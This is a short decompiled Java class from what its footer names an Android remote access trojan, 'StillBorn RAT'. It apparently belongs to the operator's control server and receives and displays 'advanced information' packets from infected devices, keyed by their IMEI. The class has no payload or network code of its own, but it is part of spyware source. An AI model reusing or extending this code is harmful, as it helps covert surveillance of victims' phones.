/*  1:   */ package handler;
/*  2:   */ 
/*  3:   */ import Packet.AdvancedInformationPacket;
/*  4:   */ import Packet.Packet;
/*  5:   */ import gui.GUI;
/*  6:   */ import java.util.HashMap;
/*  7:   */ import server.Server;
/*  8:   */ 
/*  9:   */ public class AdvInfoHandler
/* 10:   */   implements PacketHandler
/* 11:   */ {
/* 12:   */   private GUI gui;
/* 13:   */   private int channel;
/* 14:   */   private String imei;
/* 15:   */   
/* 16:   */   public AdvInfoHandler(int chan, String imei, GUI gui)
/* 17:   */   {
/* 18:34 */     this.channel = chan;
/* 19:35 */     this.imei = imei;
/* 20:36 */     this.gui = gui;
/* 21:   */   }
/* 22:   */   
/* 23:   */   public void receive(Packet p, String imei) {}
/* 24:   */   
/* 25:   */   public void handlePacket(Packet p, String temp_imei, Server c)
/* 26:   */   {
/* 27:46 */     this.gui.logTxt("Bilgiler alındı");
/* 28:47 */     ((ChannelDistributionHandler)c.getChannelHandlerMap().get(this.imei)).removeListener(this.channel);
/* 29:48 */     AdvancedInformationPacket packet = (AdvancedInformationPacket)p;
/* 30:49 */     this.gui.updateAdvInformations(this.imei, packet);
/* 31:   */   }
/* 32:   */ }


/* Location:           C:\Users\SmileyFacedHacker\Downloads\StillBorn RAT (Android)\StillBorn RAT (Android)\StillBornRAT.jar
 * Qualified Name:     handler.AdvInfoHandler
 * JD-Core Version:    0.7.0.1
 */